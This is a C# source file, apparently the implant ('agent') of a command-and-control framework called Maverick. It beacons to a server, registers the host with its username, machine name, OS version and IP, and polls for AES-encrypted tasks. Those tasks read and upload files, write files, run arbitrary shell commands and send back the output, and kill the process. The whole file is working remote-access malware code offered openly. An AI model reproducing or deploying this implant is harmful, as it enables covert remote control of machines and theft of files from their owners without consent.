using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Security.AccessControl;
using System.Text;
using System.Threading.Tasks;

namespace Maverick.Agent
{
    public static class CommandSender
    {
        private static bool isRegistry = false;
        private static readonly string BaseURL = "http://127.0.0.1:8000";

        private static int InternalID = 0;

        private static readonly string LocalIP = GetIpv4();


        private static string GetIpv4()
        {
            string localIP = "127.0.0.1"; // fallback
            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }

        private static byte[] GenerateClientInfoPayload()
        {
            InfoClientModel info = new InfoClientModel
            {
                InternalID = InternalID,
                ClientID = Guid.NewGuid().ToString(),
                Username = Environment.UserName,
                Hostname = Environment.MachineName,
                OSversion = Environment.OSVersion.ToString(),
                ClientVersion = "1.0.0",
                NumOfMonitors = System.Windows.Forms.Screen.AllScreens.Length,
                ClientIP = LocalIP,
            };
            return Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(info));
        }

        private static byte[] GenerateResponseCommand(CommandRequestModel cmd, byte[] Data, FileUploadModel file)
        {
            CommandRequestModel command = new CommandRequestModel
            {
                InternalID = InternalID,
                ActionType = cmd.ActionType,
                Data = Data,
                FileUpload = file,
                Command = cmd.Command,
                CommandID = cmd.CommandID,
            };
            return Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(command));
        }

        public static async Task BeaconingAsync()
        {
            if (!isRegistry)
            {
                //do registry
                var payload = await CryptoFunction.EncryptAESPayload(GenerateClientInfoPayload());
                var response = await TrafficFunction.SendDataAsync(BaseURL + "/api/new", payload);
                if (response == null) return;
                if (int.TryParse(Encoding.UTF8.GetString(response), out int newID))
                {
                    InternalID = newID;
                    isRegistry = true;
                }
                return;
            }
            
            var newCommand = await TrafficFunction.SendDataAsync(BaseURL + "/api/get", BitConverter.GetBytes(InternalID));
            if (newCommand != null && newCommand.Length > 0)
            {
                try
                {
                    var check = Encoding.UTF8.GetString(newCommand);
                    if (uint.TryParse(check, out var result))
                    {
                        if (result == 0xffffffff)
                        {
                            InternalID = 0;
                            isRegistry = false;
                            return;
                        }
                        if (result == 0) //mostly not called, mean client send not a valid integer InternalID
                        {
                            return;
                        }
                    }
                }
                catch { }
                var rawData = await CryptoFunction.DecryptAESPayload(newCommand);
                var Command = System.Text.Json.JsonSerializer.Deserialize<CommandRequestModel>(rawData);
                switch (Command.ActionType)
                {
                    case "INFOCLIENT":
                        {
                            var infoData = GenerateClientInfoPayload();
                            var encryptData = await CryptoFunction.EncryptAESPayload(infoData);
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                            break;
                        }
                    case "GETFILE":
                        {
                            var fileData = ActionFunction.PerformReadFile(Command.Command);
                            var toSend = GenerateResponseCommand(Command, null, fileData);
                            var encryptData = await CryptoFunction.EncryptAESPayload(toSend);
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                            break;
                        }
                    case "SENDFILE":
                        {
                            var success = ActionFunction.PerformWriteFile(Command.Command, Command.Data);
                            var response = Encoding.UTF8.GetBytes(success ? "Ok" : "");
                            var toSend = GenerateResponseCommand(Command, response, null);
                            var encryptData = await CryptoFunction.EncryptAESPayload(toSend);
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                            break;
                        }
                    case "DOCOMMAND":
                        {
                            var output = ActionFunction.PerformDoCommand(Command.Command);
                            var toSend = GenerateResponseCommand(Command, output, null);
                            var encryptData = await CryptoFunction.EncryptAESPayload(toSend);
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                            break;
                        }
                    case "KILLAPPLICATION":
                        {
                            var toSend = GenerateResponseCommand(Command, Encoding.UTF8.GetBytes("Ok"), null);
                            var encryptData = await CryptoFunction.EncryptAESPayload(toSend);
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                            ActionFunction.PerformKillSystem();
                            break;
                        }
                    default:
                        {
                            // Unknown command
                            break;
                        }
                }
            }
        }
    }
}
